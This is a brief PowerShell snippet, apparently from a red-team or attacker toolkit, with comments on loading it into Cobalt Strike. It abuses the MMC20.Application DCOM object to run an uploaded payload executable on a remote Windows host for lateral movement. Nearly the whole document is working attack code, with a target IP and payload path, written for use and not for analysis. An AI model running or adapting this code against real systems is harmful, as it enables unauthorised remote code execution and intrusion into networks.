# COM Object (Remote) execution, works against MMC Com object found on windows systems; need system level access for remote execution
# 	- Create a powershell script on your localsystem (attack platform) and create a function to remote call through Cobalt Strike
# 	- Change IP to target & directory for place of uploaded payload on the target system
#	- Example: powershell-import /root/Desktop/scripts/powershell_COM_remote_call.ps1
#			  - powershell Get-Remote      --provides powershell execution of callback
function Get-Remote {
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.1.10"))
$com.Document.ActiveView.ExecuteShellCommand("C:\ProgramData\noservice64.exe",$null,$null,"7")
}

